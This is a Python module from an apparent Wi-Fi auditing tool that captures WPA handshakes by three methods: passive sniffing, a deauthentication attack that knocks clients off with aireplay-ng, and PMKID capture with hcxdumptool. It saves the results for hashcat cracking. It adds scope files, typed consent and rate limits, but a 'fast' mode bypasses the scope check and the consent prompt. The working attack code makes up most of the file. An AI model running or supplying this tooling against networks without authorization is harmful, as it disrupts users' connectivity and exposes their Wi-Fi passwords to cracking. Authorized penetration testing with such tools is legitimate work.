#!/usr/bin/env python3
"""
Handshake capture module.

Strategies:
  1. Passive – wait for a natural 4-way handshake (scope warning only)
  2. Deauth  – send deauth frames to force a reconnect (scope REQUIRED)
  3. PMKID   – capture PMKID from AP beacon (scope REQUIRED)

Ethical safeguards
──────────────────
• Scope check   : deauth and PMKID require the BSSID to be listed in scope.yaml
• Consent prompt: user must type the BSSID before any frame is sent
• Rate limiter  : deauth bursts limited to DEFAULT_MAX_BURSTS_PER_MIN
• Audit log     : every deauth burst logged with timestamp + user
"""
from __future__ import annotations

import logging
import os
import re
import shutil
import subprocess
import tempfile
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

from modules.banner import C, info, success, warn, error, print_section
from modules.ratelimit import DeauthRateLimiter, DEFAULT_MAX_BURSTS_PER_MIN
from modules.scope import ScopeManager

logger = logging.getLogger(__name__)

HANDSHAKE_TIMEOUT_DEFAULT = 120
DEAUTH_COUNT              = 10
DEAUTH_INTERVAL           = 5
CAPTURE_DIR               = "captures"

os.makedirs(CAPTURE_DIR, exist_ok=True)

# Per-session rate limiter instance (reset on new session via CLI)
_rate_limiter: Optional[DeauthRateLimiter] = None


def get_rate_limiter(max_bursts: int = DEFAULT_MAX_BURSTS_PER_MIN) -> DeauthRateLimiter:
    global _rate_limiter
    if _rate_limiter is None:
        _rate_limiter = DeauthRateLimiter(max_bursts_per_min=max_bursts)
    return _rate_limiter


###############################################################################
# Public entry point
###############################################################################

def capture_handshake_menu(
    interface: str,
    target: dict,
    auto: bool = False,
    scope: Optional[ScopeManager] = None,
    deauth_limit: int = DEFAULT_MAX_BURSTS_PER_MIN,
    fast: bool = False,
) -> Optional[str]:
    """
    Interactive menu for handshake capture.
    Returns path to .cap / .hash file, or None on failure.
    """
    print_section("Handshake Capture")
    bssid   = target["bssid"]
    channel = target["channel"]
    ssid    = target.get("ssid", target.get("essid", bssid))

    info(f"Target : {ssid}  [{bssid}]  CH{channel}")

    if auto:
        strategy = "2"
    else:
        print(f"""
  {C.WHITE}Capture Strategy:{C.RESET}
  {C.GREEN}[1]{C.RESET} Passive   – wait for natural handshake  {C.DIM}(no frames sent){C.RESET}
  {C.GREEN}[2]{C.RESET} Deauth    – force reconnect  {C.YELLOW}(recommended — requires scope.yaml){C.RESET}
  {C.GREEN}[3]{C.RESET} PMKID     – capture from AP beacon  {C.DIM}(requires scope.yaml){C.RESET}
  {C.RED}[0]{C.RESET} Back
""")
        strategy = input(f"  {C.YELLOW}Strategy: {C.RESET}").strip()

    if strategy == "0":
        return None

    timeout = HANDSHAKE_TIMEOUT_DEFAULT
    if not auto:
        try:
            t = input(f"  {C.YELLOW}Timeout in seconds [{timeout}]: {C.RESET}").strip()
            if t:
                timeout = int(t)
        except ValueError:
            pass

    ssid_safe = re.sub(r"[^\w]", "_", ssid)
    stamp     = datetime.now().strftime("%Y%m%d_%H%M%S")
    cap_base  = os.path.join(CAPTURE_DIR, f"{ssid_safe}_{stamp}")

    if strategy == "1":
        # Passive: scope warning only (no frames sent)
        if scope and not scope.is_authorized(bssid):
            warn(f"BSSID {bssid} is not in scope.yaml — passive capture allowed but noted.")
            logger.warning("Passive capture on out-of-scope BSSID %s", bssid)
        return _passive_capture(interface, bssid, channel, cap_base, timeout)

    elif strategy == "2":
        # Deauth: hard scope block (or fast-mode warning)
        _enforce_scope_and_consent(scope, bssid, ssid, "Deauth + Handshake Capture", fast=fast)
        limiter = get_rate_limiter(deauth_limit)
        return _deauth_capture(interface, bssid, channel, cap_base, timeout, auto, limiter)

    elif strategy == "3":
        # PMKID: hard scope block (or fast-mode warning)
        _enforce_scope_and_consent(scope, bssid, ssid, "PMKID Capture", fast=fast)
        return _pmkid_capture(interface, bssid, cap_base, timeout)

    else:
        error("Invalid strategy.")
        return None


###############################################################################
# Scope + consent helpers
###############################################################################

def _enforce_scope_and_consent(
    scope: Optional[ScopeManager],
    bssid: str,
    ssid: str,
    operation: str,
    fast: bool = False,
) -> None:
    """Raise ScopeError if out of scope; display consent prompt and require BSSID confirmation.

    When fast=True the scope check and consent prompt are skipped and a red
    warning banner is shown instead (lab / CTF mode).
    """
    from rich.console import Console
    from rich import box
    from rich.panel import Panel
    con = Console()

    if fast:
        con.print(Panel(
            f"[bold red]⚡ FAST MODE — Scope & consent bypassed ⚡[/]\n\n"
            f"Operation: [bold]{operation}[/]\n"
            f"Target: [bold]{ssid}[/]  [{bssid}]\n\n"
            "[bold yellow]AUTHORIZED LAB / CTF USE ONLY.[/]",
            title="[bold red]Fast Mode Active[/]",
            box=box.DOUBLE, border_style="red",
        ))
        logger.warning("Fast mode: scope bypassed bssid=%s operation=%s", bssid, operation)
        return

    # ── Scope check ───────────────────────────────────────────────────────
    if scope is not None:
        scope.require_authorized(bssid, operation)

    # ── Consent prompt ────────────────────────────────────────────────────
    con.print()
    con.print(Panel(
        f"[bold red]⚠  FRAME INJECTION WARNING  ⚠[/]\n\n"
        f"You are about to perform: [bold]{operation}[/]\n\n"
        f"  [bold]BSSID:[/] {bssid}\n"
        f"  [bold]SSID: [/] {ssid}\n\n"
        "This operation sends wireless frames to the target network.\n"
        "[bold yellow]Only proceed if you have WRITTEN authorization from the owner.[/]\n\n"
        "To confirm, type the target BSSID exactly below:",
        title="[bold red]Authorization Required[/]",
        box=box.DOUBLE,
        border_style="red",
    ))

    # Require manual BSSID entry (no clipboard bypass)
    import sys
    sys.stdout.write(f"\n  Type BSSID to confirm: ")
    sys.stdout.flush()
    try:
        # Read character-by-character to disable copy-paste feel (best-effort on terminal)
        entered = input("").strip().upper()
    except KeyboardInterrupt:
        con.print("[red]Aborted.[/]")
        raise SystemExit(0)

    if entered != bssid.upper():
        con.print(f"[red]BSSID mismatch (entered {entered!r}, expected {bssid!r}). Aborting.[/]")
        raise SystemExit(1)

    confirm = input("  Proceed? [y/N]: ").strip().lower()
    if confirm != "y":
        con.print("[red]Aborted by user.[/]")
        raise SystemExit(0)

    # Log consent
    import os as _os
    try:
        username = _os.getlogin()
    except OSError:
        username = _os.environ.get("USER", "unknown")

    logger.info(
        "CONSENT_GRANTED user=%s bssid=%s operation=%s ts=%s",
        username, bssid, operation,
        datetime.now().isoformat(),
    )
    con.print(f"[green]✓ Consent logged for {bssid}[/]")


###############################################################################
# Strategy 1: Passive
###############################################################################

def _passive_capture(interface, bssid, channel, cap_base, timeout) -> Optional[str]:
    info("Passive capture — waiting for handshake...")
    return _run_airodump_until_handshake(interface, bssid, channel, cap_base, timeout)


###############################################################################
# Strategy 2: Deauth + capture
###############################################################################

def _deauth_capture(
    interface, bssid, channel, cap_base, timeout, auto, limiter: DeauthRateLimiter
) -> Optional[str]:
    client_mac = "FF:FF:FF:FF:FF:FF"
    if not auto:
        cm = input(
            f"  {C.YELLOW}Target client MAC (Enter for broadcast FF:FF:FF:FF:FF:FF): {C.RESET}"
        ).strip()
        if cm and re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", cm):
            client_mac = cm.upper()

    info(f"Deauth attack → BSSID {bssid}, client {client_mac}")
    info(f"Rate limit: {limiter._max_bursts} bursts/min  Timeout: {timeout}s")

    cap_file  = cap_base + "-01.cap"
    dump_proc = _start_airodump(interface, bssid, channel, cap_base)

    handshake_found = False
    elapsed = 0

    try:
        while elapsed < timeout:
            # Rate-limited wait before burst
            limiter.wait_for_burst(bssid)
            time.sleep(DEAUTH_INTERVAL)
            elapsed += DEAUTH_INTERVAL

            _send_deauth(interface, bssid, client_mac, DEAUTH_COUNT)
            stats = limiter.get_stats(bssid)
            info(
                f"  [{elapsed}s] Deauth burst sent  "
                f"(tokens={stats['tokens_remaining']}/{stats['capacity']}  "
                f"fps={stats['global_fps']})"
            )
            logger.debug("Deauth burst: bssid=%s elapsed=%ds", bssid, elapsed)

            if _verify_handshake(cap_file, bssid):
                handshake_found = True
                break
            if _csv_has_handshake(cap_base + "-01.csv", bssid):
                handshake_found = True
                break

    except KeyboardInterrupt:
        warn("Capture interrupted by user.")
    finally:
        dump_proc.terminate()
        dump_proc.wait()

    return _finalize(cap_file, handshake_found)


###############################################################################
# Strategy 3: PMKID
###############################################################################

def _pmkid_capture(interface, bssid, cap_base, timeout) -> Optional[str]:
    if not shutil.which("hcxdumptool"):
        error("hcxdumptool not found. Install it: sudo apt install hcxdumptool")
        return None

    pcapng_file = cap_base + "_pmkid.pcapng"
    hash_file   = cap_base + "_pmkid.hash"

    info(f"Capturing PMKID from {bssid} for {timeout}s...")
    filter_file = tempfile.NamedTemporaryFile(
        mode="w", suffix=".txt", delete=False
    )
    filter_file.write(bssid.replace(":", "") + "\n")
    filter_file.close()

    proc = subprocess.Popen(
        ["hcxdumptool", "-i", interface, "-o", pcapng_file,
         "--filterlist_ap=" + filter_file.name, "--filtermode=2", "--enable_status=1"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    try:
        time.sleep(timeout)
    except KeyboardInterrupt:
        warn("PMKID capture interrupted.")
    finally:
        proc.terminate()
        proc.wait()

    os.unlink(filter_file.name)

    if not os.path.exists(pcapng_file) or os.path.getsize(pcapng_file) == 0:
        error("No PMKID data captured.")
        return None

    info("Converting PMKID to hashcat format...")
    subprocess.run(
        ["hcxpcapngtool", "-o", hash_file, pcapng_file],
        capture_output=True, text=True,
    )

    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        success(f"PMKID hash saved: {hash_file}")
        return hash_file + ":pmkid"
    error("PMKID extraction failed.")
    return None


###############################################################################
# Internal helpers
###############################################################################

def _start_airodump(interface, bssid, channel, cap_base) -> subprocess.Popen:
    return subprocess.Popen(
        ["airodump-ng", "--bssid", bssid, "--channel", str(channel),
         "--write", cap_base, "--output-format", "cap,csv",
         "--write-interval", "2", interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )


def _run_airodump_until_handshake(interface, bssid, channel, cap_base, timeout) -> Optional[str]:
    cap_file = cap_base + "-01.cap"
    proc = _start_airodump(interface, bssid, channel, cap_base)
    handshake_found = False
    elapsed = 0
    try:
        while elapsed < timeout:
            time.sleep(5)
            elapsed += 5
            info(f"  [{elapsed}s] Waiting for handshake...")
            if _verify_handshake(cap_file, bssid):
                handshake_found = True
                break
    except KeyboardInterrupt:
        warn("Capture interrupted.")
    finally:
        proc.terminate()
        proc.wait()
    return _finalize(cap_file, handshake_found)


def _send_deauth(interface, bssid, client_mac, count) -> None:
    subprocess.run(
        ["aireplay-ng", "--deauth", str(count), "-a", bssid, "-c", client_mac, interface],
        capture_output=True,
    )


def _verify_handshake(cap_file: str, bssid: str) -> bool:
    if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
        return False
    try:
        result = subprocess.run(
            ["aircrack-ng", cap_file], capture_output=True, text=True, timeout=15
        )
        output = result.stdout + result.stderr
        if re.search(r"WPA\s*\(\s*[1-9]\d*\s*handshake", output, re.IGNORECASE):
            return True
        for line in output.splitlines():
            if bssid.upper() in line.upper():
                m = re.search(r"WPA.*?(\d+)\s+handshake", line, re.IGNORECASE)
                if m and int(m.group(1)) > 0:
                    return True
    except Exception:
        pass
    return False


def _csv_has_handshake(csv_path: str, bssid: str) -> bool:
    if not os.path.exists(csv_path):
        return False
    try:
        with open(csv_path, "r", errors="replace") as f:
            return "handshake" in f.read().lower()
    except OSError:
        return False


def _finalize(cap_file: str, found: bool) -> Optional[str]:
    if found:
        success(f"WPA handshake captured! → {cap_file}")
        logger.info("Handshake captured: %s", cap_file)
        return cap_file
    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
        warn("Timeout reached. Capture saved — you can try cracking it anyway.")
        return cap_file
    error("No valid handshake captured.")
    return None
